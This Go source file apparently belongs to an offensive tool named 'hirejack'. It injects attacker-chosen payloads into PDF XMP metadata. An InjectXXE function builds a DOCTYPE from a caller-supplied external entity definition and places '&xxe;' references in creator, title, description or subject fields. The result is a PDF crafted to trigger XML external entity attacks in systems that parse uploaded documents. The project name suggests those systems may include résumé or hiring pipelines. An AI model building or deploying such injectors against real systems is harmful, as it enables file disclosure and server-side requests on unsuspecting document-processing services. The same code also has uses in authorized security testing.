package injectors

import (
	"bytes"
	"fmt"
	"regexp"

	"hirejack/internal/pdf"
)

// XMPInjector injects payloads into XMP metadata.
type XMPInjector struct{}

// XMPConfig specifies what to inject.
type XMPConfig struct {
	// Dublin Core fields
	Creator     string `json:"creator,omitempty"`
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
	Subject     string `json:"subject,omitempty"`

	// XXE injection
	Doctype    string `json:"doctype,omitempty"`     // Raw DOCTYPE to inject
	XXEEntity  string `json:"xxe_entity,omitempty"`  // Entity definition
	XXEPayload string `json:"xxe_payload,omitempty"` // Where to use &entity;
}

// NewXMPInjector creates a new XMP injector.
func NewXMPInjector() *XMPInjector {
	return &XMPInjector{}
}

// Inject applies XMP payloads to a PDF.
func (i *XMPInjector) Inject(p *pdf.PDF, config XMPConfig) error {
	xmp, err := p.GetXMP()
	if err != nil {
		return err
	}
	if xmp == nil {
		xmp = pdf.NewXMPPacket()
	}

	// Set DOCTYPE if provided (for XXE)
	if config.Doctype != "" {
		xmp.Doctype = config.Doctype
	}

	// Inject fields into XMP XML
	raw := xmp.Raw
	if config.Creator != "" {
		raw = injectXMPField(raw, "dc:creator", config.Creator)
	}
	if config.Title != "" {
		raw = injectXMPField(raw, "dc:title", config.Title)
	}
	if config.Description != "" {
		raw = injectXMPField(raw, "dc:description", config.Description)
	}
	if config.Subject != "" {
		raw = injectXMPField(raw, "dc:subject", config.Subject)
	}
	xmp.Raw = raw

	return p.SetXMP(xmp)
}

// InjectXXE specifically injects XXE payload.
func (i *XMPInjector) InjectXXE(p *pdf.PDF, entityDef, useIn string) error {
	doctype := fmt.Sprintf("<!DOCTYPE foo [\n  %s\n]>", entityDef)

	config := XMPConfig{
		Doctype: doctype,
	}

	// Place entity reference in specified field
	switch useIn {
	case "dc:creator", "creator":
		config.Creator = "&xxe;"
	case "dc:title", "title":
		config.Title = "&xxe;"
	case "dc:description", "description":
		config.Description = "&xxe;"
	case "dc:subject", "subject":
		config.Subject = "&xxe;"
	default:
		config.Creator = "&xxe;"
	}

	return i.Inject(p, config)
}

// InjectFields injects Dublin Core fields.
func (i *XMPInjector) InjectFields(p *pdf.PDF, fields map[string]string) error {
	config := XMPConfig{}
	for k, v := range fields {
		switch k {
		case "dc:creator", "creator":
			config.Creator = v
		case "dc:title", "title":
			config.Title = v
		case "dc:description", "description":
			config.Description = v
		case "dc:subject", "subject":
			config.Subject = v
		}
	}
	return i.Inject(p, config)
}

// injectXMPField inserts a field into XMP XML.
func injectXMPField(raw []byte, field, value string) []byte {
	// Try to find existing field and replace
	pattern := regexp.MustCompile(fmt.Sprintf(`<%s>.*?</%s>`, field, field))
	replacement := fmt.Sprintf("<%s>%s</%s>", field, value, field)

	if pattern.Match(raw) {
		return pattern.ReplaceAll(raw, []byte(replacement))
	}

	// Insert before </rdf:Description>
	marker := []byte("</rdf:Description>")
	insert := []byte(fmt.Sprintf("      <%s>%s</%s>\n    ", field, value, field))

	idx := bytes.Index(raw, marker)
	if idx == -1 {
		return raw
	}

	result := make([]byte, 0, len(raw)+len(insert))
	result = append(result, raw[:idx]...)
	result = append(result, insert...)
	result = append(result, raw[idx:]...)
	return result
}
